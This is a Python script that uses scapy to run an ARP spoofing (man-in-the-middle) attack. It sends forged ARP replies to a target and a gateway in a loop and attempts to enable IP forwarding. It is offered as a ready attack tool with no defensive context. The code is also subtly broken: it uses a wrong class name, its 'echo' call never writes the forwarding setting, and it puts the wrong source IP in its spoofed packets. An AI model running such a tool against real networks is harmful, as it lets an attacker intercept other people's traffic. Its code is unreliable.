#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import subprocess


def spoof(target_ip, source_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)  # op=2 stands for
    # the type of request
    scapy.send(packet)  # send the packet


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.ETHER(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-ip", dest="target_ip", help="IP to target interface")
    parser.add_argument("-s", "--source-ip", dest="source", help="IP to source")
    parser.add_argument("--gateway-ip", dest="gateway_ip", help="IP to target gateway")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Introduce target's IP")
    elif not options.source:
        parser.error("Introduce source [YOU :) ]")
    elif not options.gateway_ip:
        parser.error("Introduce gateway's IP")
    return options


def enable_ip_fwr():
    exit_code = subprocess.call(['echo', '1', '/proc/sys/net/ipv4/ip_forward'])
    print(exit_code)


arguments = get_argument()
enable_ip_fwr()
try:
    while True:
        spoof(arguments.target_ip, arguments.source)
        spoof(arguments.gateway_ip, arguments.source)
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Program finished")




